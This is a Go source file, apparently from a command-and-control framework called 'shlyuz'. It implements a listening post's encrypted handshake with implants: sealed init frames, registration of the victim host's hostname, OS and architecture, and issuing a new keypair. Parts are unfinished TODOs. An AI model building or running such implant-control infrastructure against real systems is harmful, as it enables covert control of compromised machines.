package transaction

import (
	"encoding/json"
	"log"
	"shlyuz/internal/debugLp/pkg/component"
	"shlyuz/internal/debugLp/pkg/instructions"
	"shlyuz/internal/debugLp/pkg/transport"
	routine "shlyuz/pkg/crypto"
	"shlyuz/pkg/crypto/asymmetric"
)

type initFrameArgs struct {
	manifest component.ComponentManifest
	lpk      asymmetric.PublicKey
}

type implantInitFrameArgs struct {
	manifest component.ImplantManifest
	ipk      asymmetric.PublicKey
}

type implantInitAckArgs struct {
	Lpk  asymmetric.PublicKey
	Txid string
}

type RegisteredClient struct {
	InitArgs  implantInitFrameArgs
	CurPubKey asymmetric.PublicKey
	Interface transport.TransportMethod
	Id        string
}

func GenerateInitFrame(component component.Component) instructions.InstructionFrame {
	var initFrame instructions.Transaction
	var initArgs initFrameArgs

	initFrame.Cmd = "ii"
	initArgs.manifest = component.Manifest
	argMapping := initFrameArgs{manifest: component.Manifest, lpk: component.InitalKeypair.PubKey}
	argMap, _ := json.Marshal(argMapping)
	initFrame.Arg = argMap
	initFrame.ComponentId = component.Config.Id
	instructionFrame := instructions.CreateInstructionFrame(initFrame, true)
	return *instructionFrame
}

func decodeInitFrame(initFrame []byte) instructions.InstructionFrame {
	var implantInitInstructionFrame instructions.InstructionFrame
	err := json.Unmarshal(initFrame, &implantInitInstructionFrame)
	if err != nil {
		log.Println("failed to decode received init frame: ", err)
	}
	return implantInitInstructionFrame
}

func writeToChannel(channel chan []byte, data []byte) {
	channel <- data
}

func readFromChannel(channel chan []byte) []byte {
	data := <-channel
	return data
}

func RelayInitFrame(shlyuzComponent *component.Component, initFrame instructions.InstructionFrame, shlyuzTransport transport.TransportMethod) *component.Component {
	frameMap, _ := json.Marshal(initFrame)
	transmitFrame, frameKeyPair := routine.PrepareSealedFrame(frameMap, shlyuzComponent.CurrentImpPubkey, shlyuzComponent.XorKey, shlyuzComponent.Config.InitSignature)
	shlyuzComponent.CurrentKeypair = frameKeyPair
	go writeToChannel(shlyuzComponent.CmdChannel, transmitFrame)
	// TODO: Do the relaying and retreive the ackFrame
	boolSuccess, err := shlyuzTransport.Send(shlyuzComponent)
	if boolSuccess == false {
		log.Fatalln("failed to send init: ", err)
	}
	log.Println("Sent init frame.")
	return shlyuzComponent
}

func RetrieveInitFrame(shlyuzComponent *component.Component, shlyuzTransport transport.TransportMethod) (instructions.InstructionFrame, RegisteredClient, bool) {
	var ackInstruction instructions.InstructionFrame
	var client RegisteredClient
	data, boolSuccess, err := shlyuzTransport.Recv(shlyuzComponent)
	if boolSuccess == false {
		log.Println("failed to receive from channel: ", err)
		return ackInstruction, client, false
	}
	implantInitFrame := routine.UnwrapSealedFrame(data, shlyuzComponent.InitalKeypair.PrivKey, shlyuzComponent.InitalKeypair.PubKey, shlyuzComponent.XorKey, shlyuzComponent.Config.InitSignature)
	if implantInitFrame == nil {
		log.Println("failed to decode initalization frame: ", err)
		return ackInstruction, client, false
	}
	implantInitInstruction := decodeInitFrame(implantInitFrame)

	// TODO: Register the txid as an event with the dated timestamp
	// TODO: Check to see if the implant is already registered. Attempt a rekey if so, otherwise ignore host unless considered dead.
	// TODO: Check to see if the implant is using an expected/known ID
	// Check if cmd is ii
	if implantInitInstruction.Cmd != "ii" {
		log.Println("[WARNING] invalid initalization frame detected, but with valid keys. Received cmd: ", implantInitInstruction.Cmd)
		log.Println("[WARNING] This should never happen and may indicate an attack. Please contact the devlopers immediately and provide the following:")
		log.Println("[dbginitinstruction]: ", implantInitInstruction)
		log.Println("[dbginitframe]: ", implantInitFrame)
		log.Println("[dbgdata]: ", data)
		return ackInstruction, client, false
	}

	var implantInit implantInitFrameArgs
	implantInit.manifest.Implant_hostname = implantInitInstruction.Uname.Uname.Nodename
	implantInit.manifest.Implant_id = implantInitInstruction.ComponentId
	implantInit.manifest.Implant_os = implantInitInstruction.Uname.Uname.Sysname
	implantInit.manifest.Implant_arch = implantInitInstruction.Uname.Uname.Machine
	implantInit.ipk = shlyuzComponent.CurrentImpPubkey

	client.CurPubKey = implantInit.ipk
	client.Id = implantInit.manifest.Implant_id
	client.Interface = shlyuzTransport
	client.InitArgs = implantInit

	// Prepares ack frame
	var ackTransaction instructions.Transaction
	ackTransaction.Cmd = "ipi"
	ackTransaction.ComponentId = shlyuzComponent.ComponentId
	ackTransaction.TxId = implantInitInstruction.TxId
	// TODO: This is a keypair that is unique to the implant
	// Generate a new keypair for the LP to use
	shlyuzComponent.CurrentKeypair, err = asymmetric.GenerateKeypair()
	if err != nil {
		log.Println("failed to generate new keypair")
	}
	argMapping := implantInitAckArgs{Lpk: shlyuzComponent.CurrentKeypair.PubKey, Txid: implantInitInstruction.TxId}
	argMap, _ := json.Marshal(argMapping)
	ackInstruction = *instructions.CreateInstructionFrame(ackTransaction, false)
	ackInstruction.CmdArgs = string(argMap)
	return ackInstruction, client, true
}

func rekey(frame routine.EncryptedFrame) {

}
